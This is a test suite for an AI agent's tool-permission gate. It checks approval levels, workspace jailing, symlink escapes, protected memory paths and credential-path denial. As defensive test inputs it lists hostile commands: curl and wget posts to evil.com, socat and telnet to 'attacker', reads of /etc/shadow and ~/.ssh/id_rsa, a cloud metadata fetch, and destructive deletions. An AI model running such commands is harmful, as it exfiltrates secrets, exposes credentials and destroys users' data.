/**
 * Tool Execution Policy tests.
 *
 * Validates the single-surface policy gate (one tool ladder for floating and
 * project-anchored sessions), the L1-L4 adjudication, and the sensitive-path
 * denials. chat/work are storage labels only - they no longer split capability.
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import {
  CHAT_MAX_DURATION_MS,
  CHAT_MAX_TOKENS,
  CHAT_MAX_TOOL_FAILURES,
  CHAT_MAX_TURNS,
  MEMORY_L1_MAX_LINES,
  POLICY_PROFILE,
  WORK_MAX_DURATION_MS,
  WORK_MAX_TOKENS,
  WORK_MAX_TOOL_FAILURES,
  WORK_MAX_TURNS,
  checkPolicy,
  isSensitivePath,
} from "../src/policy.js";

let workspace: string;
let outsideFile: string;

beforeAll(() => {
  workspace = fs.mkdtempSync(path.join(os.tmpdir(), "penglai-policy-"));
  fs.writeFileSync(path.join(workspace, "file.txt"), "hello\n");
  fs.mkdirSync(path.join(workspace, "sub"), { recursive: true });
  outsideFile = path.join(os.tmpdir(), "penglai-policy-outside.txt");
  fs.writeFileSync(outsideFile, "secret\n");
});

afterAll(() => {
  fs.rmSync(workspace, { recursive: true, force: true });
  fs.rmSync(outsideFile, { force: true });
});

describe("policy: project-anchored (jail = workspace)", () => {

  it("allows read in workspace", () => {
    const d = checkPolicy("read", { path: "file.txt" }, workspace);
    expect(d.allowed).toBe(true);
  });

  it("allows read in a workspace subdirectory", () => {
    const d = checkPolicy("read", { path: "sub/deep.txt" }, workspace);
    expect(d.allowed).toBe(true);
  });

  it("allows write in workspace", () => {
    const d = checkPolicy("write", { path: "out.txt", content: "x" }, workspace);
    expect(d.allowed).toBe(true);
  });

  it("asks L2 confirmation for edit (modifies an existing file)", () => {
    const d = checkPolicy("edit", { path: "file.txt", old_text: "a", new_text: "b" }, workspace);
    expect(d.allowed).toBe(false);
    expect(d.code).toBe("needs_confirm");
    expect(d.level).toBe("L2");
    expect(d.approval?.capability).toBe("l2:modify-existing");
  });

  it("requires L3 for every bash command until an OS sandbox ships", () => {
    const read = checkPolicy("bash", { command: "echo hello" }, workspace);
    expect(read.allowed).toBe(false);
    expect(read.code).toBe("needs_approval");
    expect(read.level).toBe("L3");
    const write = checkPolicy("bash", { command: "npm install" }, workspace);
    expect(write.allowed).toBe(false);
    expect(write.code).toBe("needs_approval");
    expect(write.level).toBe("L3");
    const danger = checkPolicy("bash", { command: "git push origin main" }, workspace);
    expect(danger.allowed).toBe(false);
    expect(danger.code).toBe("needs_approval");
    expect(danger.level).toBe("L3");
  });

  it("denies read of mykey.py (sensitive)", () => {
    const d = checkPolicy("read", { path: "mykey.py" }, workspace);
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/sensitive|policy_denied/i);
  });

  it("denies read of .env (sensitive)", () => {
    const d = checkPolicy("read", { path: ".env" }, workspace);
    expect(d.allowed).toBe(false);
  });

  it("denies read of .ssh/id_rsa (sensitive)", () => {
    const d = checkPolicy("read", { path: ".ssh/id_rsa" }, workspace);
    expect(d.allowed).toBe(false);
  });

  it("denies read of a *.pem file (sensitive)", () => {
    const d = checkPolicy("read", { path: "cert.pem" }, workspace);
    expect(d.allowed).toBe(false);
  });

  it("denies read outside the workspace", () => {
    const d = checkPolicy("read", { path: outsideFile }, workspace);
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/outside/i);
  });

  it("denies write outside the workspace via '..' traversal", () => {
    const d = checkPolicy("write", { path: "../penglai-policy-outside.txt", content: "x" }, workspace);
    expect(d.allowed).toBe(false);
  });
});

describe("policy: floating (same full tools, jail = workspace)", () => {

  it("allows read in workspace", () => {
    const d = checkPolicy("read", { path: "file.txt" }, workspace);
    expect(d.allowed).toBe(true);
  });

  it("allows new writes, asks L2 for edit, and keeps bash at L3", () => {
    // new file write = L1
    expect(checkPolicy("write", { path: "out.txt", content: "x" }, workspace).allowed).toBe(true);
    // overwrite existing = L2 needs_confirm (permission dial / approval), NOT needs_work_mode
    const edit = checkPolicy("edit", { path: "file.txt", old_text: "a", new_text: "b" }, workspace);
    expect(edit.allowed).toBe(false);
    expect(edit.code).toBe("needs_confirm");
    // No OS process sandbox: even echo requires an explicit L3 decision.
    expect(checkPolicy("bash", { command: "echo hello" }, workspace)).toMatchObject({
      allowed: false,
      code: "needs_approval",
      level: "L3",
    });
  });

  it("still denies sensitive paths on read", () => {
    const d = checkPolicy("read", { path: "mykey.json" }, workspace);
    expect(d.allowed).toBe(false);
  });

  it("denies reads outside the workspace jail", () => {
    const d = checkPolicy("read", { path: outsideFile }, workspace);
    expect(d.allowed).toBe(false);
    expect(["policy_denied", "l4_denied"]).toContain(d.code);
  });
});

describe("policy: protected Host namespace and conversation-scoped drafts", () => {
  let dataDir: string;
  let groundMemory: string;
  let sopRoot: string;
  let ownDrafts: string;
  let otherDrafts: string;

  beforeAll(() => {
    dataDir = fs.mkdtempSync(path.join(os.tmpdir(), "penglai-protected-data-"));
    groundMemory = path.join(dataDir, "memory", "global");
    sopRoot = path.join(groundMemory, "sop");
    ownDrafts = path.join(dataDir, "drafts", "conv_owner");
    otherDrafts = path.join(dataDir, "drafts", "conv_other");
    for (const dir of [groundMemory, sopRoot, ownDrafts, otherDrafts, path.join(dataDir, "pi-sessions")]) {
      fs.mkdirSync(dir, { recursive: true });
    }
    fs.writeFileSync(path.join(groundMemory, "L1.md"), "memory\n");
    fs.writeFileSync(path.join(sopRoot, "manual-poison.md"), "poison\n");
    fs.writeFileSync(path.join(ownDrafts, "reply.md"), "draft\n");
    fs.writeFileSync(path.join(otherDrafts, "private.md"), "other\n");
  });

  afterAll(() => {
    fs.rmSync(dataDir, { recursive: true, force: true });
  });

  const ctx = () => ({
    assistantReadRoots: [path.join(groundMemory, "L1.md"), ownDrafts],
    assistantWriteRoots: [ownDrafts],
    protectedRoots: [dataDir],
  });

  it("allows memory reads but hard-denies generic memory writes and edits", () => {
    const read = checkPolicy(
      "read",
      { path: path.join(groundMemory, "L1.md") },
      workspace,
      ctx(),
    );
    expect(read.allowed).toBe(true);

    const write = checkPolicy(
      "write",
      { path: path.join(groundMemory, "global", "note.md"), content: "x" },
      workspace,
      ctx(),
    );
    expect(write).toMatchObject({ allowed: false, code: "l4_denied", level: "L4" });
    expect(write.approval).toBeUndefined();

    const edit = checkPolicy(
      "edit",
      { path: path.join(groundMemory, "L1.md"), old_text: "memory", new_text: "poison" },
      workspace,
      ctx(),
    );
    expect(edit).toMatchObject({ allowed: false, code: "l4_denied", level: "L4" });

    const rawSop = checkPolicy(
      "read",
      { path: path.join(sopRoot, "manual-poison.md") },
      workspace,
      ctx(),
    );
    expect(rawSop).toMatchObject({ allowed: false, code: "l4_denied", level: "L4" });
  });

  it("allows read/write/edit only in this conversation's exact draft root", () => {
    const write = checkPolicy(
      "write",
      { path: path.join(ownDrafts, "new.md"), content: "x" },
      workspace,
      ctx(),
    );
    expect(write).toMatchObject({ allowed: true, level: "L1" });

    const edit = checkPolicy(
      "edit",
      { path: path.join(ownDrafts, "reply.md"), old_text: "draft", new_text: "ready" },
      workspace,
      ctx(),
    );
    expect(edit).toMatchObject({ allowed: true, level: "L1" });

    const readOther = checkPolicy(
      "read",
      { path: path.join(otherDrafts, "private.md") },
      workspace,
      ctx(),
    );
    expect(readOther).toMatchObject({ allowed: false, code: "l4_denied", level: "L4" });
    const writeOther = checkPolicy(
      "write",
      { path: path.join(otherDrafts, "pwn.md"), content: "x" },
      workspace,
      ctx(),
    );
    expect(writeOther).toMatchObject({ allowed: false, code: "l4_denied", level: "L4" });
  });

  it("protects current and future runtime-owned files even when dataDir sits inside the jail", () => {
    const parentJail = path.dirname(dataDir);
    for (const target of [
      path.join(dataDir, "sop", "deploy.md"),
      path.join(dataDir, "pi-sessions", "conv.jsonl"),
      path.join(dataDir, "workbench", "state.json"),
      path.join(dataDir, "updates", "backup", "manifest.json"),
      path.join(dataDir, "future-runtime-owned", "state.bin"),
    ]) {
      const decision = checkPolicy(
        "write",
        { path: target, content: "x" },
        parentJail,
        ctx(),
      );
      expect(decision.allowed, target).toBe(false);
      expect(decision.level, target).toBe("L4");
      expect(decision.approval, target).toBeUndefined();
    }
  });

  it("hard-denies statically visible protected paths in bash, while own-draft bash is graded by risk", () => {
    for (const command of [
      `cat ${path.join(groundMemory, "L1.md")}`,
      `echo poisoned > ${path.join(dataDir, "sop", "deploy.md")}`,
      `python3 -c "open('${path.join(dataDir, "channels.json")}', 'w')"`,
    ]) {
      const decision = checkPolicy("bash", { command }, workspace, ctx());
      expect(decision.allowed, command).toBe(false);
      expect(["l4_denied", "policy_denied"], command).toContain(decision.code);
      expect(decision.level, command).toBe("L4");
      expect(decision.approval, command).toBeUndefined();
    }

    // A read-only command in own draft jail is L1; a redirect write is L2.
    const readOnly = checkPolicy(
      "bash",
      { command: "ls -la" },
      ownDrafts,
      ctx(),
    );
    expect(readOnly).toMatchObject({ allowed: false, code: "needs_approval", level: "L3" });

    const write = checkPolicy(
      "bash",
      { command: "echo ready > result.txt" },
      ownDrafts,
      ctx(),
    );
    expect(write).toMatchObject({
      allowed: false,
      code: "needs_approval",
      level: "L3",
    });
  });

  it("documents the W3 boundary: dynamically constructed bash paths are never L1", () => {
    const dynamic = checkPolicy(
      "bash",
      { command: "bash -c 'cat \"$PENGLAI_DATA_DIR/memory/L1.md\"'" },
      workspace,
      ctx(),
    );
    // Static analysis cannot resolve $VAR; the command must not be L1.
    // It is either L4 (if the protected-root detector flags memory/L1.md)
    // or L2 (unknown verb → ask), never silent autonomous.
    expect(dynamic.allowed).toBe(false);
    expect(["l4_denied", "needs_confirm", "needs_approval"]).toContain(dynamic.code);
  });

  it("hard-denies lexical and resolved symlink aliases around the protected namespace", () => {
    const protectedAlias = path.join(dataDir, "workspace-alias");
    const memoryAlias = path.join(workspace, "penglai-memory-alias");
    const draftEscape = path.join(ownDrafts, "workspace-escape");
    const symlinkType = process.platform === "win32" ? "junction" : "dir";
    try {
      fs.symlinkSync(workspace, protectedAlias, symlinkType);
      fs.symlinkSync(groundMemory, memoryAlias, symlinkType);
      fs.symlinkSync(workspace, draftEscape, symlinkType);
    } catch (error) {
      const code = (error as NodeJS.ErrnoException).code;
      if (code === "EPERM" || code === "EACCES") return;
      throw error;
    }

    try {
      // Lexically under dataDir, even though the link resolves back into the
      // ordinary project jail.
      expect(
        checkPolicy(
          "write",
          { path: path.join(protectedAlias, "new.md"), content: "x" },
          workspace,
          ctx(),
        ),
      ).toMatchObject({ allowed: false, code: "l4_denied", level: "L4" });

      // Lexically under the jail, but resolving into Host memory.
      expect(
        checkPolicy(
          "write",
          { path: path.join(memoryAlias, "poison.md"), content: "x" },
          workspace,
          ctx(),
        ),
      ).toMatchObject({ allowed: false, code: "l4_denied", level: "L4" });

      // Lexically under the one writable draft, but resolving outside it.
      expect(
        checkPolicy(
          "write",
          { path: path.join(draftEscape, "escaped.md"), content: "x" },
          ownDrafts,
          ctx(),
        ),
      ).toMatchObject({ allowed: false, code: "l4_denied", level: "L4" });

      expect(
        checkPolicy(
          "bash",
          { command: `cat ${path.relative(workspace, memoryAlias)}/L1.md` },
          workspace,
          ctx(),
        ),
      ).toMatchObject({ allowed: false, code: "l4_denied", level: "L4" });
    } finally {
      for (const target of [protectedAlias, memoryAlias, draftEscape]) {
        fs.rmSync(target, { force: true });
      }
    }
  });

  it("denies path-bearing file tools when the path is missing", () => {
    for (const tool of ["read", "write", "edit"] as const) {
      const decision = checkPolicy(tool, {}, workspace, ctx());
      expect(decision).toMatchObject({
        allowed: false,
        code: "policy_denied",
        level: "L4",
      });
    }
  });
});

describe("policy: single-surface profile (chat/work labels share one spec)", () => {
  it("the profile carries the full file-tool surface (label ≠ capability)", () => {
    const spec = POLICY_PROFILE;
    expect(spec.fileTools).toEqual(["read", "write", "edit", "bash"]);
    expect(spec.allowsBash).toBe(true);
    expect(spec.hostTools).toEqual([]);
    expect(spec.maxTurns).toBe(CHAT_MAX_TURNS);
    expect(spec.budget.maxDurationMs).toBe(CHAT_MAX_DURATION_MS);
    expect(spec.budget.maxTokens).toBe(CHAT_MAX_TOKENS);
    expect(spec.budget.maxToolFailures).toBe(CHAT_MAX_TOOL_FAILURES);
  });

  it("every provisional budget is a finite positive value awaiting calibration", () => {
    for (const value of [
      CHAT_MAX_TURNS,
      CHAT_MAX_DURATION_MS,
      CHAT_MAX_TOKENS,
      CHAT_MAX_TOOL_FAILURES,
      WORK_MAX_TURNS,
      WORK_MAX_DURATION_MS,
      WORK_MAX_TOKENS,
      WORK_MAX_TOOL_FAILURES,
    ]) {
      expect(Number.isFinite(value)).toBe(true);
      expect(value).toBeGreaterThan(0);
    }
    expect(MEMORY_L1_MAX_LINES).toBe(30);
  });
});

describe("policy: L4 jail refusals", () => {
  it("marks a jail escape as l4_denied (L4)", () => {
    const d = checkPolicy("read", { path: outsideFile }, workspace);
    expect(d.allowed).toBe(false);
    expect(d.code).toBe("l4_denied");
    expect(d.level).toBe("L4");
    expect(d.reason).toMatch(/outside/i);
  });

  it("marks sensitive credential paths as L4-class denials", () => {
    const d = checkPolicy("read", { path: "mykey.py" }, workspace);
    expect(d.allowed).toBe(false);
    expect(d.code).toBe("policy_denied");
    expect(d.level).toBe("L4");
  });
});

describe("policy: the four-level adjudication matrix (审批四级制)", () => {
  it("L1 自主: reads and new-file drafts need no approval", () => {
    const read = checkPolicy("read", { path: "file.txt" }, workspace);
    expect(read.allowed).toBe(true);
    expect(read.level).toBe("L1");

    const draft = checkPolicy("write", { path: "draft-new.txt", content: "x" }, workspace);
    expect(draft.allowed).toBe(true);
    expect(draft.level).toBe("L1");

  });

  it("L2 常规确认: overwriting existing files asks once", () => {
    const overwrite = checkPolicy("write", { path: "file.txt", content: "x" }, workspace);
    expect(overwrite.allowed).toBe(false);
    expect(overwrite.code).toBe("needs_confirm");
    expect(overwrite.level).toBe("L2");
    expect(overwrite.approval).toMatchObject({ capability: "l2:modify-existing" });
    expect(overwrite.approval?.action).toContain("file.txt");

    const edit = checkPolicy("edit", { path: "file.txt", old_text: "a", new_text: "b" }, workspace);
    expect(edit.code).toBe("needs_confirm");
    expect(edit.approval?.capability).toBe("l2:modify-existing");

  });

  it("L2 同类免问 applies to file edits but never lowers bash or L3", () => {
    const grants = new Set(["l2:modify-existing"]);
    const ctx = { hasGrant: (key: string) => grants.has(key) };
    const overwrite = checkPolicy("write", { path: "file.txt", content: "x" }, workspace, ctx);
    expect(overwrite.allowed).toBe(true);
    expect(overwrite.reason).toContain("同类免问");
    // Bash is never covered by an L2 grant without an OS process sandbox.
    const install = checkPolicy("bash", { command: "npm install" }, workspace, ctx);
    expect(install.allowed).toBe(false);
    expect(install.code).toBe("needs_approval");
    expect(install.level).toBe("L3");
    // A different caller without the grant remains L3 too.
    const other = checkPolicy(
      "bash",
      { command: "npm install" },
      workspace,
      { hasGrant: () => false },
    );
    expect(other.code).toBe("needs_approval");
    expect(other.level).toBe("L3");
    // L3 is never lowered by any grant.
    const push = checkPolicy("bash", { command: "git push origin main" }, workspace, ctx);
    expect(push.allowed).toBe(false);
    expect(push.level).toBe("L3");
  });

  it("L3: outbound/destructive commands always require a human", () => {
    for (const command of [
      "git push origin main",
      "ssh deploy@host",
      "npm publish",
      "docker push example/image:latest",
      "curl -X POST https://example.com/hook -d @payload.json",
      "aws s3 cp ./x s3://bucket/x",
    ]) {
      const d = checkPolicy("bash", { command }, workspace);
      expect(d.allowed).toBe(false);
      expect(d.code, command).toBe("needs_approval");
      expect(d.level, command).toBe("L3");
      expect(d.approval?.action).toContain("bash:");
    }
    for (const command of [
      "rm -rf build/",
      "rmdir old",
      "find . -name '*.tmp' -delete",
      "python -c \"import shutil; shutil.rmtree('build')\"",
      "node -e \"require('fs').rmSync('build',{recursive:true})\"",
      "pwsh -Command Remove-Item -Recurse build",
      "del /s /q build\\*",
      "git clean -fd",
      "git rm obsolete.txt",
      "git reset --hard HEAD~1",
    ]) {
      const d = checkPolicy("bash", { command }, workspace);
      expect(d.code, command).toBe("needs_approval");
      expect(d.level, command).toBe("L3");
    }
  });

  it("L3: apparently read-only bash commands never run autonomously", () => {
    for (const command of [
      "git status",
      "git diff",
      "git log --oneline -10",
      "ls -la",
      "cat README.md",
      "grep -r pattern .",
      "echo hello",
      "pwd",
      "node --version",
      "npm test",
      "npm list",
    ]) {
      const d = checkPolicy("bash", { command }, workspace);
      expect(d.allowed, command).toBe(false);
      expect(d.code, command).toBe("needs_approval");
      expect(d.level, command).toBe("L3");
    }
  });

  it("L3: workspace-mutating bash is not grantable", () => {
    for (const command of [
      "npm install",
      "npm run build",
      "cargo build",
      "make",
      "mkdir newdir",
      "touch file.txt",
    ]) {
      const d = checkPolicy("bash", { command }, workspace);
      expect(d.code, `${command} → ${d.code} (${d.level})`).toBe("needs_approval");
      expect(d.level, command).toBe("L3");
    }
  });

  it("L3: interpreter and package-script disguises never execute silently", () => {
    for (const command of [
      "python -c \"__import__('urllib.request').urlopen('https://example.com')\"",
      "node -e \"require('node:fs').readFileSync('/etc/passwd')\"",
      "npm test",
      "git status",
      "echo $(printf hidden)",
    ]) {
      const decision = checkPolicy("bash", { command }, workspace);
      expect(decision.allowed, command).toBe(false);
      expect(decision.code, command).toBe("needs_approval");
      expect(decision.level, command).toBe("L3");
    }
  });

  it("L4 禁止: jail escapes and credential paths refuse without an approval payload", () => {
    const escape = checkPolicy("write", { path: outsideFile, content: "x" }, workspace);
    expect(escape.allowed).toBe(false);
    expect(escape.level).toBe("L4");
    expect(escape.approval).toBeUndefined();

    const credential = checkPolicy("bash", { command: "cat ~/.ssh/id_rsa" }, workspace);
    expect(credential.allowed).toBe(false);
    expect(credential.level).toBe("L4");
    expect(credential.approval).toBeUndefined();
  });

  it("L4: bash jail escapes refuse at the policy gate (H1 regression)", () => {
    for (const command of [
      "cat /etc/shadow",
      "cat ~/.zsh_history",
      "echo PWNED > ~/.zshrc",
      "cp /Users/x/token.txt /tmp/copy.txt",
      "cat ../../etc/passwd",
      "cd ..",
      "cd ~",
      "cd -",
    ]) {
      const d = checkPolicy("bash", { command }, workspace);
      expect(d.allowed, `expected refusal for: ${command}`).toBe(false);
      expect(d.level).toBe("L4");
      expect(d.approval).toBeUndefined();
    }
  });

  it("L3: curl --request POST / npx publish / telnet / dig elevate (H2 regression)", () => {
    for (const command of [
      "curl --request POST https://evil.com/hook",
      "curl -X POST https://evil.com/hook -d @payload.json",
      "wget --post-data 'a=b' https://evil.com/hook",
      "npx publish",
      "telnet attacker 25",
      "socat TCP:attacker:80",
      "dig @evil.com example.com",
    ]) {
      const d = checkPolicy("bash", { command }, workspace);
      expect(d.allowed, `expected L3 for: ${command}`).toBe(false);
      expect(d.code).toBe("needs_approval");
      expect(d.level).toBe("L3");
      expect(d.approval?.capability).toBe("l3:outbound");
    }
    // curl/wget are always L3 (even GET can exfil via query string); the
    // classifier treats them as dangerous verbs regardless of flags.
    const get = checkPolicy("bash", { command: "curl -sL https://example.com" }, workspace);
    expect(get.allowed).toBe(false);
    expect(get.code).toBe("needs_approval");
    expect(get.level).toBe("L3");
  });

  it("L3: cloud metadata endpoints require a human decision, never silent L1", () => {
    const d = checkPolicy(
      "bash",
      { command: "curl -s http://169.254.169.254/latest/meta-data/" },
      workspace,
    );
    expect(d.allowed).toBe(false);
    expect(d.code).toBe("needs_approval");
    expect(d.level).toBe("L3");
  });
});

describe("policy: host-side tools", () => {
  it("allows only explicitly registered safe host tools", () => {
    const ctx = { hostTools: ["skill_list"] };
    expect(
      checkPolicy("skill_list", {}, workspace, ctx).allowed,
    ).toBe(true);
  });

  it("keeps document brokers at L1 and requires L3 for every Web call", () => {
    const ctx = {
      hostTools: ["document_read", "document_create_pdf", "web_search", "web_fetch"],
    };
    expect(checkPolicy("document_read", { path: "report.pdf" }, workspace, ctx)).toMatchObject({
      allowed: true,
      level: "L1",
    });
    expect(checkPolicy("document_create_pdf", { path: "new.pdf" }, workspace, ctx)).toMatchObject({
      allowed: true,
      level: "L1",
    });
    expect(checkPolicy("web_search", { query: "PenglaiAgent" }, workspace, ctx)).toMatchObject({
      allowed: false,
      level: "L3",
      code: "needs_approval",
      approval: { capability: "l3:web" },
    });
    expect(checkPolicy("web_fetch", { url: "https://example.com" }, workspace, ctx)).toMatchObject({
      allowed: false,
      level: "L3",
      code: "needs_approval",
      approval: { capability: "l3:web" },
    });
  });

  it("requires a fresh L3 decision for every registered MCP tool call", () => {
    const decision = checkPolicy("mcp_demo_ping", { value: "x" }, workspace, {
      hostTools: ["mcp_demo_ping"],
      hasGrant: () => true,
    });
    expect(decision.allowed).toBe(false);
    expect(decision.level).toBe("L3");
    expect(decision.approval?.capability).toBe("l3:mcp");
  });

  it("denies unregistered tools", () => {
    const d = checkPolicy("some_future_tool", { objective: "x" }, workspace);
    expect(d.allowed).toBe(false);
    expect(d.code).toBe("policy_denied");
  });
});

describe("policy: unknown tool", () => {
  it("is denied under both profiles", () => {
    expect(checkPolicy("rm_rf", {}, workspace).allowed).toBe(false);
    expect(checkPolicy("rm_rf", {}, workspace).allowed).toBe(false);
  });
});

describe("isSensitivePath", () => {
  it("flags the constitution §7.2 key paths", () => {
    expect(isSensitivePath("mykey.py")).toBe(true);
    expect(isSensitivePath("mykey.json")).toBe(true);
    expect(isSensitivePath(".ssh/id_rsa")).toBe(true);
    expect(isSensitivePath("id_rsa")).toBe(true);
    expect(isSensitivePath("id_ed25519")).toBe(true);
    expect(isSensitivePath("id_ecdsa")).toBe(true);
    expect(isSensitivePath(".env")).toBe(true);
    expect(isSensitivePath(".env.local")).toBe(true);
    expect(isSensitivePath("server.key")).toBe(true);
    expect(isSensitivePath("cert.pem")).toBe(true);
    expect(isSensitivePath("credentials")).toBe(true);
  });

  it("does not flag ordinary files or public-key variants", () => {
    expect(isSensitivePath("file.txt")).toBe(false);
    expect(isSensitivePath("src/index.ts")).toBe(false);
    expect(isSensitivePath("id_rsa.pub")).toBe(false);
    expect(isSensitivePath("credentials.json")).toBe(true);
    expect(isSensitivePath("environment.ts")).toBe(false);
  });
});
